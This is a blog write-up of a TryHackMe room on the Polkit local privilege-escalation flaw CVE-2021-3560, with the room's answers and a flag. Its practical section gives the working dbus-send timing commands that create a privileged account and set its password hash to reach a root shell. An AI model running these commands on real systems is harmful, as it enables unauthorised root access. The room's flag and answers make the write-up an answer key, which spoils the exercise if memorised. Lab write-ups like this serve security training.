---
title: Polkit CVE-2021-3560
author: CYB3RM3
name: CYB3RM3 | Polkit CVE-2021-3560
date: 2022-01-30 12:52:29 +0100
categories: [TryHackMe, CVE]
tags: [CVE]
---

Walkthrough room for CVE-2021-3560

THM Room [https://tryhackme.com/room/polkit](https://tryhackme.com/room/polkit)


## TASK 1 : Info Deploy
### Click the green "Start Machine" button to deploy the machine!
No Answer

## TASK 2 : Info Important! About Dynamic Flags
### What is the URL of the website you should submit dynamic flags to?
Answer : https://flag.muir.land/

## TASK 3 : Tutorial Background
### In what version of Ubuntu's policykit-1 is CVE-2021-3560 patched?
Answer : 0.105-26ubuntu1.1

### What program can we use to run commands as other users via polkit?
Answer : pkexec

## TASK 4 : Tutorial Exploitation Process
### Read the information above
No Answer.

## TASK 5 : Practical Do it for yourself! 
### Root Flag
Using the following steps as explained in the task :

```console
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
```
{: .nolineno }

This gives us the time for the execution +/- 11 ms so break it after 5 ms :

```console
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
```
{: .nolineno }

We need to do the same message for ddbus with the password hash we generated :

```console
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedeskt
op/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'$6$97K8LUgOaabpqA5Z$u5s5mH9fyGvw9/FtW62A0mmE.wH
O1Pl.MTLFlx60PqZSLax5zOAyWiylmuMxE.8Odm3Gwpy645ldoYbwsl8Jn/' string:"ask the pentester" & sleep 0.005s; kill $!
```
{: .nolineno }

I need 3 try to get it correctly because of mispelling the request :

![dbus-send](/images/thm/polkit/polkit_1.png)
_dbus-send_

We can now go into root shell :

![Root](/images/thm/polkit/polkit_2.png)
_Root_

And go to the dynamic flag website from Muiri <https://flag.muir.land/> to submit our root.txt content and retrieve the flag :

![Flag](/images/thm/polkit/polkit_3.png)
_Flag_

Answer : THM{N2I0MTgzZTE4ZWQ0OGY0NjdiNTQ0NTZi}